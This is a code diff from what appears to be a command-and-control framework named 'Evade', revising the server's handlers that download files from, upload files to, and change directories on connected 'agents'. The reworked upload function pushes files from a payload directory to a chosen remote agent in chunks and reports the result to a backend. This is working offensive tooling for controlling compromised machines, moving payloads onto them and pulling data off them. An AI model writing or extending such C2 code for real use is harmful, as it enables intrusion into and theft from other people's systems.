@@ -44,8 +44,6 @@ def handle_agent_connection(conn, addr):
         print(f"Error handling agent connection: {e}")
         conn.close()
 
-
-
 def handle_special_command(conn, agent_id, command):
     '''Handles special commands like download, upload, and cd.'''
     try:
@@ -55,9 +53,9 @@ def handle_special_command(conn, agent_id, command):
         if action == 'download':
             filename = cmd_parts[1] if len(cmd_parts) > 1 else ''
             handle_download(agent_id, filename)  # Corrected to match function signature
-        elif action == 'upload':
-            filename = cmd_parts[1] if len(cmd_parts) > 1 else ''
-            handle_upload(conn, filename)
+        elif action == 'upload' and len(cmd_parts) > 1:
+            filename = cmd_parts[1]
+            handle_upload(agent_id, filename)
         elif action == 'cd':
             directory = cmd_parts[1] if len(cmd_parts) > 1 else ''
             handle_change_directory(conn, directory)
@@ -112,38 +110,41 @@ def handle_download(agent_id, filename):
         except ValueError:
             print(f"Invalid response for file size from agent {agent_id}.")
 
-def handle_upload(conn, filename):
-    """Handles upload command."""
-    upload_dir = 'E:\\Github\\Repos\\Evade-A-C2-Framework\\upload'
-    file_path = os.path.join(upload_dir, filename)
-    try:
-        if os.path.exists(file_path):
+def handle_upload(agent_id, filename):
+    """Handles the upload command, sending a file to the agent."""
+    agent_conn = agent_connections.get(agent_id)
+    if not agent_conn:
+        print(f"No connection found for agent {agent_id}")
+        return
+
+    # Adjust the file_path to include the agent_id subdirectory
+    uploads_dir = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\back-end\payload\uploads'
+    file_path = os.path.join(uploads_dir, agent_id, filename)  # Include the agent_id in the path
+
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as file:
+            # Inform the agent about the file size
             file_size = os.path.getsize(file_path)
-            if file_size > 0:
-                cmd = f"upload {filename} {file_size}"
-                conn.send(cmd.encode())
-                response = conn.recv(2048).decode()
-                if response.strip() == "Ready for upload":
-                    with open(file_path, 'rb') as f:
-                        while True:
-                            chunk = f.read(2048)
-                            if not chunk:
-                                break  # End of file
-                            conn.send(chunk)
-                    # Waiting for the agent's acknowledgment of upload completion
-                    response = conn.recv(2048).decode()
-                    if response.startswith("File Upload Successful"):
-                        print("File uploaded successfully.")
-                    else:
-                        print("Error during file upload.")
+            agent_conn.send(f"upload {filename} {file_size}".encode())
+            
+            # Wait for the agent to signal readiness
+            response = agent_conn.recv(2048).decode()
+            if response.strip() == "Ready for upload":
+                # Start sending the file in chunks
+                chunk = file.read(2048)
+                while chunk:
+                    agent_conn.send(chunk)
+                    chunk = file.read(2048)
+
+                # Wait for a confirmation response from the agent
+                response = agent_conn.recv(2048).decode()
+                if response.startswith("File Upload Successful"):
+                    send_result_back_to_backend(response, agent_id)
+                    print(f"Upload of '{filename}' to agent {agent_id} complete.")
                 else:
-                    print("Client not ready to receive file.")
-            else:
-                print("Error: File is empty.")
-        else:
-            print("Error: File not found.")
-    except Exception as e:
-        print(f"Error during upload: {str(e)}")
+                    print(f"Upload failed or agent {agent_id} was not ready. Response: {response}")
+    else:
+        print(f"Error: File {filename} not found for agent {agent_id}.")
 
 def handle_change_directory(conn, directory):
     """Handles change directory command."""
